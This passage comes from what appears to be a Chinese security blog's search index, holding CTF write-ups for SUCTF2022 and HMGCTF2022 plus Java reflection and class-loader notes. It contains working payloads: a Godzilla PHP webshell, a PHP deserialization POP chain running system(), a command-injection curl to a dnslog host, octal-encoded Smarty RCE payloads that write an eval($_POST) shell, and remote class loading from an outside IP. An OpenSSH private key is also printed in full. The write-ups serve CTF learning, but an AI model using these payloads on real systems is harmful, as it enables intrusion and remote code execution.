try{ Runtime.getRuntime().exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); } catch(Exception e) { e.printStackTrace(); } } } 然后在项目里远程加载这个类 import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class URLClassLoaderTest { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException { URL url = new URL(\"http://101.35.98.118:12424/javatest/\"); URLClassLoader cl = new URLClassLoader(new URL[]{url}); Class c = cl.loadClass(\"Test\"); c.newInstance(); } } ","date":"2022-03-30","objectID":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/:4:0","series":null,"tags":null,"title":"[Java安全]类加载器ClassLoader","uri":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/#urlclassloader"},{"categories":["CTF"],"content":"Misc","date":"2022-03-28","objectID":"/suctf2022/:0:0","series":null,"tags":null,"title":"[SUCTF2022] WP","uri":"/suctf2022/#misc"},{"categories":["CTF"],"content":"Hi hacker下载到是一个流量包，分析tcp流，发现是一个后面执行命令的 这里有一个文件jenkins_secret.zip 看下一个包里面，他进行了这样的操作 这看起来像是把文件发送的一个作用 分析icmp协议，找到这个secret文件 压缩文件是损坏的 binwalk分离一些，修复一下压缩包，总共就弄到了这些东西，还差了一些xml文件 这些应该是什么某种加密 这个是java的一个类似于插件的一个东西 org.jenkinsci.main.modules.instance_identity github：https://github.com/jenkinsci/instance-identity-plugin 在github搜了一下，找到了几个对应的文件 找到了一个jenkins的解密的一个项目 https://github.com/hoto/jenkins-credentials-decryptor 这几个文件在流量包里都能找到，但是xml文件一直提取不出来 他发送是只是一个数据包，但是这里他分了四块去传输，这样数据混乱了，我无法将他们重新拼接起来，不知道是从哪里断的 找了一下规律，第一个应该是由PK来开头的，猜测数据应该是由这里开始 每一个文件结尾都有个，猜测也是icmp传输的某个格式文本 而且只有最后第565个包里面是有压缩文件尾的，504b0506 所以我猜测是四个拼接起来合成完整的zip文件 我尝试和了一下，用winrar修复了一下 差一个global_config.xml，而且xml文件还是处于损坏状态，无法提取。。。 脱出四个分块，放一起对比一下，相同的尾 拼了很久很久发现，漏了几个包 主要看这里 过滤一下(icmp.ident == 135) \u0026\u0026 (ip.src == 172.17.0.2) 把8个包的data流拿出来，去掉头部和尾部再拼接 终于得到了完好的压缩包，xml文件算是拿到了 然后就是用刚才的工具 解密得到一个github是ssh私钥 还有一个hint 这里获取了ssh的私钥 -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY----- 流量包里面，第一个http流里面有这样的信息 所以接下来的目标就是利用这个私钥去拉取这个仓库 把私钥文件丢到~./ssh里面 然后用私钥去生成一个公钥 ssh-keygen -y -f id_rsa \u003e id_rsa.pub 然后就可以clone了 git clone Esonhugh@github:Esonhugh/secret_source_code.git 里面的文件就是http的第一个包的服务，没有flag，那就看一下git log，果然发现了端倪 都看了一下，发现flag是在source1里面 DASCTF{Oh!_H4ck_f0r_c0d3s-and_4buse_1t} ","date":"2022-03-28","objectID":"/suctf2022/:1:0","series":null,"tags":null,"title":"[SUCTF2022] WP","uri":"/suctf2022/#hi-hacker"},{"categories":["CTF"],"content":"月圆之夜其实就是找一个映射的关系 比如机械师是mechanic，对应了他的字母，然后翻译出来对应回去就是了 mechanic werewolf magician knight soul hunter n witch nun apothecary Ranger 对比一下flag dasctf{welcometothefullmoonnight} ","date":"2022-03-28","objectID":"/suctf2022/:2:0","series":null,"tags":null,"title":"[SUCTF2022] WP","uri":"/suctf2022/#月圆之夜"},{"categories":["CTF"],"content":"什么奇奇怪怪的东西打开有一个mrf文件，MRF 文件是由 Bartels Media Mouse Recorder 创建的数据文件 还有一个flag.zip，里面有一个vhd文件，也被加密了 在这里下载一个MouseRecorder https://www.macrorecorder.com/download/ 这里记录了一些鼠标操作记录 打开画图，然后让他画出来 结果是397643258669 用这个密码去解开压缩包，拿到vhd文件，挂载上以后，里面有这么些文件 ppt里面有这么一段字符 9876543210/.-,+*)E'CB;:?\u003e=\u003c;4Xyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONML xlsx里面的内容 KJIHGFED`B^]V[TYXWVUNrLQJONMLKDh+*)('\u0026\u003cA@?8=\u003c;:92Vwvutsrqponmlkjihgfedcba`_^ txt里面的内容 '\u0026B$:?8=\u003c;:3W76/4-Qrqponmlkjihgfedcbawv{zyxwvutsl2poQmle+LKJIHGcE[`YX]V[ZSw: 看这个图片的16进制，在末尾接了一段数据，是png的反转89054e74 提取出来反转一下，解出来是半个二维码 原png的文件名解码是flag4 ","date":"2022-03-28","objectID":"/suctf2022/:3:0","series":null,"tags":null,"title":"[SUCTF2022] WP","uri":"/suctf2022/#什么奇奇怪怪的东西"},{"categories":["CTF"],"content":"Au5t1n的秘密中间有http流，貌似是扫描了一下目录 在1994组里面，貌似是扫到了后台 这里用admin:admin貌似登陆进去了 进后台后进行了一个上传操作，这里提示了密钥是key is key1** 传了文件名为key.php.mod 第二次上传 内容是一个木马，didi.php，是一个哥斯拉马子，但是好像还改过 \u003c?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $c = $K[$i+1\u002615]; $D[$i] = $D[$i]^$c; } return $D; } $payloadName='payload'; $key='093c1c388069b7e1'; $data=file_get_contents(\"php://input\"); if ($data!==false){ $data=encode($data,$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); eval($payload); echo encode(@run($data),$key); }else{ if (stripos($data,\"getBasicsInfo\")!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 继续往后翻，找到对这个后面的利用了 被加密了，解一下哥斯拉的加密才行 写一个脚本逆一下 \u003c?php function encode($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $c = $K[$i+1\u002615]; $D[$i] = $D[$i]^$c; } return $D; } $payloadName='payload'; $key='093c1c388069b7e1'; $data='1d430243025e5d4c55444a5f56174351401b4a0a6e391c6763736a5f56174351401b4a0a6e395e4d5e554d0b580b11424c5d4b15135e4b114b3b3342174511425c7 。 。（省略） 。 70657304a4b4c555b7f1759061919023e69114f726d2d75726c656e636f6465640d0a436f6e74656e742d4c656e6774683a2031390d0a0d0a545617590c5776595d533b66376531445c4017'; echo encode(hex2bin($data),$key); 解密拿到源码，这就是哥斯拉注入的一些东西，不用管 $parameters=array(); $_SES=array(); function run($pms){ reDefSystemFunc(); $_SES=\u0026getSession(); @session_start(); $sessioId=md5(session_id()); if (isset($_SESSION[$sessioId])){ $_SES=unserialize((S1MiwYYr(base64Decode($_SESSION[$sessioId],$sessioId),$sessioId))); } @session_write_close(); if (canCallGzipDecode()==1\u0026\u0026@isGzipStream($pms)){ $pms=gzdecode($pms); } formatParameter($pms); if 。 。（省略） 。 strlen($string); $i++){ array_push($bytes,ord($string[$i])); } return $bytes; } 再看看他其他的操作，这个流里面就是一些加载配置的操作了 后面的包，流量就解不出了，不知道为啥 他们有一个特征就是都有一个这样的头 我怀疑是不是有一个什么格式，后来去了解了一下哥斯拉的木马，发现在Godzillas v3.03以后对发送以及返回流量增加了gzip压缩，我把脚本一改 \u003c?php function encode($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $c = $K[$i+1\u002615]; $D[$i] = $D[$i]^$c; } return $D; } $payloadName='payload'; $key='093c1c388069b7e1'; $data=''; echo bin2hex(encode(hex2bin($data),$key)); 看一下文件头，哦豁，真是gzip压缩的格式 这样就可以拉去gzip -d解压了 解压出来，果然有数据！！ 然后就可以去试了 在当前目录发现了flag.zip，时间还是2022的 然后就是一个个的去试，在2079号包里面，找到了相关信息 上面的解密得到，这是他文件上传的表单，我们就可以拿下这个flag.zip了 但是他有一个密码，密码为password is md5(Godzilla' key)，那找key就是最后的一步了 key进行md5后的前16位为 093c1c388069b7e1 写一个脚本爆破一下 import string import hashlib def md5(s): return hashlib.md5(s.encode(encoding='utf-8')).hexdigest() s = string.printable k = 'key1' for a in s: for b in s: for c in s: key = k+a+b+c if(md5(key)[0:16]==\"093c1c388069b7e1\"): print(key) break md5加密以后解开压缩包拿到flag 093c1c388069b7e18bb4e898fc5ee049 ","date":"2022-03-28","objectID":"/suctf2022/:4:0","series":null,"tags":null,"title":"[SUCTF2022] WP","uri":"/suctf2022/#au5t1n的秘密"},{"categories":["CTF"],"content":"Web","date":"2022-03-28","objectID":"/suctf2022/:0:0","series":null,"tags":null,"title":"[SUCTF2022] WP","uri":"/suctf2022/#web"},{"categories":["CTF"],"content":"ezpop题目给了如下代码 \u003c?php class crow { public $v1; public $v2; function eval() { echo new $this-\u003ev1($this-\u003ev2); } public function __invoke() { $this-\u003ev1-\u003eworld(); } } class fin { public $f1; public function __destruct() { echo $this-\u003ef1 . '114514'; } public function run() { ($this-\u003ef1)(); } public function __call($a, $b) { echo $this-\u003ef1-\u003eget_flag(); } } class what { public $a; public function __toString() { $this-\u003ea-\u003erun(); return 'hello'; } } class mix { public $m1; public function run() { ($this-\u003em1)(); } public function get_flag() { eval('#' . $this-\u003em1); } } 入口的类肯定是fin，最后的目的肯定是在mix里面的get_flag方法里面去执行eval函数 get_flag的入口也在fin里面，是fin的__call函数，而能调用call的只有一个地方，就是crow的__invoke函数 那能调用invoke的地方这里就有很多了 fin里面的run方法 或者mix的run方法 这里不知道从哪里开始分析，那就先看入口fin的__destruct函数，这里进行了一个字符串拼接，那么就是会触发一个__toString方法了 toString方法只有what有，那么f1的值就应该是what了 这里进what的tostring以后会调用run方法，这里就有分支了，但是感觉两个都用得到，所以可能是利用了这个trick，[class,func]去跳转到crow的eval方法 一开始想着要把所有方法都连接上。所以这样想的 new fin(new what(new fin([new crow(new what(1),new mix(new crow(new fin(new mix(1)),1))),\"eval\"]))) 但是发现tostring会比析构还先执行，导致打不通， 然后发现是不是我想复杂了，直接用这个小trick连上get_flag方法就能直接执行了。。。 这里还耍我一轮 写马写不了 直接看当前目录 这里又耍我一轮 拿到flag 最后的poc \u003c?php class crow { public $v1; public $v2; public function __construct($a,$b){ $this-\u003ev1 = $a; $this-\u003ev2 = $b; } function eval() { echo new $this-\u003ev1($this-\u003ev2); } public function __invoke() { $this-\u003ev1-\u003eworld(); } } class fin { public $f1; public function __construct($a){ $this-\u003ef1 = $a; } public function __destruct() { echo $this-\u003ef1 . '114514'; } public function run() { ($this-\u003ef1)(); } public function __call($a, $b) { echo $this-\u003ef1-\u003eget_flag(); } } class what { public $a; public function __construct($a){ $this-\u003ea = $a; } public function __toString() { $this-\u003ea-\u003erun(); return 'hello'; } } class mix { public $m1; public function __construct($a){ $this-\u003em1 = $a; } public function run() { ($this-\u003em1)(); } public function get_flag() { eval('#' .$this-\u003em1); } } #$ser = new fin(new what(new fin([new crow(new what(1),new mix(new crow(new fin(new mix(1)),1))),\"eval\"]))); $ser = new fin(new what(new fin([new mix('?\u003e\u003c?php system(\"cat H0mvz*\");?\u003e'),'get_flag']))); echo urlencode(serialize($ser)); ","date":"2022-03-28","objectID":"/suctf2022/:1:0","series":null,"tags":null,"title":"[SUCTF2022] WP","uri":"/suctf2022/#ezpop"},{"categories":["CTF"],"content":"calc题目给了源码 #coding=utf-8 from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory import random from urllib import parse import os from werkzeug.utils import secure_filename import time app=Flask(__name__) def waf(s): blacklist = ['import','(',')',' ','_','|',';','\"','{','}','\u0026','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__'] flag = True for no in blacklist: if no.lower() in s.lower(): flag= False print(no) break return flag @app.route(\"/\") def index(): \"欢迎来到SUctf2022\" return render_template(\"index.html\") @app.route(\"/calc\",methods=['GET']) def calc(): ip = request.remote_addr num = request.values.get(\"num\") log = \"echo {0} {1} {2}\u003e ./tmp/log.txt\".format(time.strftime(\"%Y%m%d-%H%M%S\",time.localtime()),ip,num) if waf(num): try: data = eval(num) os.system(log) except: pass return str(data) else: return \"waf!!\" if __name__ == \"__main__\": app.run(host='0.0.0.0',port=5000) 这里就是传了一个num参数进去，这里如果参数通过了waf，那么就会计算结果，并且system函数执行log，猜测这里是通过注入一些危险的命令去执行 这里有一个waf，过滤了很多东西 blacklist = ['import','(',')',' ','_','|',';','\"','{','}','\u0026','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__'] 但是由于命令执行没有回显，所以用dnslog，这样操作可以绕过 空格用%09代替 直接注入代码会报错，因为num代码会走进eval造成报错，所以需要加一个#作为注释符来绕过 1%23%60curl%09zeej2v.dnslog.cn%60 可以成功执行命令 试着反弹shell，直接执行弹shell不行，很多被过滤了，所以我们利用wget去传命令上去执行 ","date":"2022-03-28","objectID":"/suctf2022/:2:0","series":null,"tags":null,"title":"[SUCTF2022] WP","uri":"/suctf2022/#calc"},{"categories":["CTF"],"content":"WEB","date":"2022-03-24","objectID":"/hmgctf2022/:0:0","series":null,"tags":null,"title":"[HMGCTF2022] WP","uri":"/hmgctf2022/#web"},{"categories":["CTF"],"content":"Fan website首先是一个www.zip的源码泄露，是laminas框架 mvc的框架首先就是看路由 在\\module\\Album\\src\\Controller\\AlbumController.php里面有功能点 \u003c?php namespace Album\\Controller; use Album\\Model\\AlbumTable; use Laminas\\Mvc\\Controller\\AbstractActionController; use Laminas\\View\\Model\\ViewModel; use Album\\Form\\AlbumForm; use Album\\Form\\UploadForm; use Album\\Model\\Album; class AlbumController extends AbstractActionController { // Add this property: private $table; private $white_list; public function __construct(AlbumTable $table){ $this-\u003etable = $table; $this-\u003ewhite_list = array('.jpg','.jpeg','.png'); } public function indexAction() { return new ViewModel([ 'albums' =\u003e $this-\u003etable-\u003efetchAll(), ]); } public function addAction() { $form = new AlbumForm(); $form-\u003eget('submit')-\u003esetValue('Add'); $request = $this-\u003egetRequest(); if (! $request-\u003eisPost()) { return ['form' =\u003e $form]; } $album = new Album(); $form-\u003esetInputFilter($album-\u003egetInputFilter()); $form-\u003esetData($request-\u003egetPost()); if (! $form-\u003eisValid()) { return ['form' =\u003e $form]; } $album-\u003eexchangeArray($form-\u003egetData()); $this-\u003etable-\u003esaveAlbum($album); return $this-\u003eredirect()-\u003etoRoute('album'); } public function editAction() { $id = (int) $this-\u003eparams()-\u003efromRoute('id', 0); if (0 === $id) { return $this-\u003eredirect()-\u003etoRoute('album', ['action' =\u003e 'add']); } // Retrieve the album with the specified id. Doing so raises // an exception if the album is not found, which should result // in redirecting to the landing page. try { $album = $this-\u003etable-\u003egetAlbum($id); } catch (\\Exception $e) { return $this-\u003eredirect()-\u003etoRoute('album', ['action' =\u003e 'index']); } $form = new AlbumForm(); $form-\u003ebind($album); $form-\u003eget('submit')-\u003esetAttribute('value', 'Edit'); $request = $this-\u003egetRequest(); $viewData = ['id' =\u003e $id, 'form' =\u003e $form]; if (! $request-\u003eisPost()) { return $viewData; } $form-\u003esetInputFilter($album-\u003egetInputFilter()); $form-\u003esetData($request-\u003egetPost()); if (! $form-\u003eisValid()) { return $viewData; } $this-\u003etable-\u003esaveAlbum($album); // Redirect to album list return $this-\u003eredirect()-\u003etoRoute('album', ['action' =\u003e 'index']); } public function deleteAction() { $id = (int) $this-\u003eparams()-\u003efromRoute('id', 0); if (!$id) { return $this-\u003eredirect()-\u003etoRoute('album'); } $request = $this-\u003egetRequest(); if ($request-\u003eisPost()) { $del = $request-\u003egetPost('del', 'No'); if ($del == 'Yes') { $id = (int) $request-\u003egetPost('id'); $this-\u003etable-\u003edeleteAlbum($id); } // Redirect to list of albums return $this-\u003eredirect()-\u003etoRoute('album'); } return [ 'id' =\u003e $id, 'album' =\u003e $this-\u003etable-\u003egetAlbum($id), ]; } public function imgdeleteAction() { $request = $this-\u003egetRequest(); if(isset($request-\u003egetPost()['imgpath'])){ $imgpath = $request-\u003egetPost()['imgpath']; $base = substr($imgpath,-4,4); if(in_array($base,$this-\u003ewhite_list)){ //白名单 @unlink($imgpath); }else{ echo 'Only Img File Can Be Deleted!'; } } } public function imguploadAction() { $form = new UploadForm('upload-form'); $request = $this-\u003egetRequest(); if ($request-\u003eisPost()) { // Make certain to merge the $_FILES info! $post = array_merge_recursive( $request-\u003egetPost()-\u003etoArray(), $request-\u003egetFiles()-\u003etoArray() ); $form-\u003esetData($post); if ($form-\u003eisValid()) { $data = $form-\u003egetData(); $base = substr($data[\"image-file\"][\"name\"],-4,4); if(in_array($base,$this-\u003ewhite_list)){ //白名单限制 $cont = file_get_contents($data[\"image-file\"][\"tmp_name\"]); if (preg_match(\"/\u003c\\?|php|HALT\\_COMPILER/i\", $cont )) { die(\"Not This\"); } if($data[\"image-file\"][\"size\"]\u003c3000){ die(\"The picture size must be more than 3kb\"); } $img_path = realpath(getcwd()).'/public/img/'.md5($data[\"image-file\"][\"name\"]).$base; echo $img_path; $form-\u003esaveImg($data[\"image-file\"][\"tmp_name\"],$img_path); }else{ echo 'Only Img Can Be Uploaded!'; } // Form is valid, save the form! //return $this-\u003eredirect()-\u003etoRoute('upload-form/success'); } } return ['form' =\u003e $form]; } } 首先是很明显是一个文件上传 public function imguploadAction() { $form = new UploadForm('upload-form'); $request = $this-\u003egetRequest(); if ($request-\u003eisPost()) {","date":"2022-03-24","objectID":"/hmgctf2022/:1:0","series":null,"tags":null,"title":"[HMGCTF2022] WP","uri":"/hmgctf2022/#fan-website"},{"categories":["CTF"],"content":"Smarty calculator也是开局有一个www.zip的源码泄露，是Smarty模板引擎，看了一下版本是3.1.39 那么他说自己修改了这个模板，那么我们下载到源文件去比较一下 重点在这个文件：smarty_internal_compile_function.php 他修改了正则过滤 再看漏洞，网上搜了一轮，在3.1.38有一个代码注入漏洞，CVE-2021-26119和CVE-2021-26120国外有师傅分析过这个漏洞 很明显我们应该就是得走这个方向 我对比了一下38和39的文件的修改，他的修改就是在这个文件里增加了一个正则过滤 在我的测试下，这个payload是可以在3.1.38下打通的 {function+name='rce(){};system(\"id\");function+'}{/function} 打断点发现这个过滤的确会拦截，所以不能直接在3.1.39打通 preg_match('/[a-zA-Z0-9_\\x80-\\xff](.*)+$/', $_name) 赛后复现，发现可以从math这里入手 在function_math.php里面，有eval可以执行命令，但是这里有一个过滤 这个过滤如果没过去，那么就会进入到error出去 这个可以用八进制去绕过 可以看到生成了模板缓存文件，将执行的命令结果输出 payload： data={$poc=\"poc\"}{math equation=\"(\\\"\\\\163\\\\171\\\\163\\\\164\\\\145\\\\155\\\")(\\\"\\\\167\\\\150\\\\157\\\\141\\\\155\\\\151\\\")\"} 拿flag写个马就行了 file_put_contents(\"1.php\",\"\u003c?php eval($_POST['a']);?\u003e\") 转一下得到 eval:{$poc=\"poc\"}{math equation=\"(\\\"\\\\146\\\\151\\\\154\\\\145\\\\137\\\\160\\\\165\\\\164\\\\137\\\\143\\\\157\\\\156\\\\164\\\\145\\\\156\\\\164\\\\163\\\")(\\\"\\\\31\\\\2e\\\\70\\\\68\\\\70\\\",\\\"\\\\74\\\\77\\\\160\\\\150\\\\160\\\\40\\\\145\\\\166\\\\141\\\\154\\\\50\\\\44\\\\137\\\\120\\\\117\\\\123\\\\124\\\\133\\\\47\\\\141\\\\47\\\\135\\\\51\\\\73\\\\77\\\\76\\\")\"} 但是这个就很奇怪，这样执行命令的话就不会经过他所修改的正则的方法里面，这是算一个非预期解吗 ","date":"2022-03-24","objectID":"/hmgctf2022/:2:0","series":null,"tags":null,"title":"[HMGCTF2022] WP","uri":"/hmgctf2022/#smarty-calculator"},{"categories":["CTF"],"content":"Misc","date":"2022-03-24","objectID":"/hmgctf2022/:0:0","series":null,"tags":null,"title":"[HMGCTF2022] WP","uri":"/hmgctf2022/#misc"},{"categories":["CTF"],"content":"MissingFile直接文本搜索都有flag了 ","date":"2022-03-24","objectID":"/hmgctf2022/:1:0","series":null,"tags":null,"title":"[HMGCTF2022] WP","uri":"/hmgctf2022/#missingfile"},{"categories":["CTF"],"content":"重要系统（复现）有键盘流量 连接上ssh后，不需要提权能直接grep到flag。。。 ","date":"2022-03-24","objectID":"/hmgctf2022/:2:0","series":null,"tags":null,"title":"[HMGCTF2022] WP","uri":"/hmgctf2022/#重要系统复现"},{"categories":["Java"],"content":"前言准备入手学习java的安全了，感觉这也是一个大的趋势，想着尽早进入到java安全的探索中，在反序列化链的学习之前，需要先学习反射，不多说了，开干吧 ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:0:0","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#前言"},{"categories":["Java"],"content":"反射","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:0:0","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#反射"},{"categories":["Java"],"content":"反射定义对象可以通过反射获取他的类，类可以通过反射拿到所有⽅法（包括私有） 通过java语言中的反射机制可以操作字节码文件，可以读和修改字节码文件 ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:1:0","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#反射定义"},{"categories":["Java"],"content":"反射的基本运用","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:0","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#反射的基本运用"},{"categories":["Java"],"content":"1. 获取类a. forName()方法只需要知道类名，在加载JDBC的时候会采用 实例代码 public class test1 { public static void main(String[] args) throws ClassNotFoundException { Class name = Class.forName(\"java.lang.Runtime\"); System.out.println(name); } } b. 直接获取使用.class去获取对象 public class test1 { public static void main(String[] args) throws ClassNotFoundException { Class\u003c?\u003e name = Runtime.class; System.out.println(name); } } c. getClass()方法obj.getClass() 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过 obj.getClass() 来获取它的类 public class test1 { public static void main(String[] args) throws ClassNotFoundException { Runtime rt = Runtime.getRuntime(); Class\u003c?\u003e name = rt.getClass(); System.out.println(name); } } d. getSystemClassLoader().loadClass()方法这个方法和forName类似，只要有类名就可以了，但是区别在于，forName的静态JVM会装载类，并执行static()中的代码 public class getSystemClassLoader { public static void main(String[] args) throws ClassNotFoundException { Class\u003c?\u003e name = ClassLoader.getSystemClassLoader().loadClass(\"java.lang.Runtime\"); System.out.println(name); } } ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:1","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#1-获取类"},{"categories":["Java"],"content":"1. 获取类a. forName()方法只需要知道类名，在加载JDBC的时候会采用 实例代码 public class test1 { public static void main(String[] args) throws ClassNotFoundException { Class name = Class.forName(\"java.lang.Runtime\"); System.out.println(name); } } b. 直接获取使用.class去获取对象 public class test1 { public static void main(String[] args) throws ClassNotFoundException { Class name = Runtime.class; System.out.println(name); } } c. getClass()方法obj.getClass() 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过 obj.getClass() 来获取它的类 public class test1 { public static void main(String[] args) throws ClassNotFoundException { Runtime rt = Runtime.getRuntime(); Class name = rt.getClass(); System.out.println(name); } } d. getSystemClassLoader().loadClass()方法这个方法和forName类似，只要有类名就可以了，但是区别在于，forName的静态JVM会装载类，并执行static()中的代码 public class getSystemClassLoader { public static void main(String[] args) throws ClassNotFoundException { Class name = ClassLoader.getSystemClassLoader().loadClass(\"java.lang.Runtime\"); System.out.println(name); } } ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:1","series":null,"tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/#a-forname方法"},{"categories":["Java"],"content":"1. 获取类a. forName()方法只需要知道类名，在加载JDBC的时候会采用 实例代码 public class test1 { public static void main(String[] args) throws ClassNotFoundException { Class name = Class.forName(\"java.lang.Runtime\"); System.out.println(name); } } b. 直接获取使用.class去获取对象 public class test1 { public static void main(String[] args) throws ClassNotFoundException { Class name = Runtime.class; System.out.println(name); } } c. getClass()方法obj.getClass() 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过 obj.getClass() 来获取它的类 public class test1 { public static void main(String[] args) throws ClassNotFoundException { Runtime rt = Runtime.getRuntime(); Class name = rt.getClass(); System.out.println(name); } } d. getSystemClassLoader().loadClass()方法这个方法和forName类似，只要有类名就可以了，但是区别在于，forName的静态JVM会装载类，并执行static()中的代码 public class getSystemClassLoader { public static void main(String[] args) throws 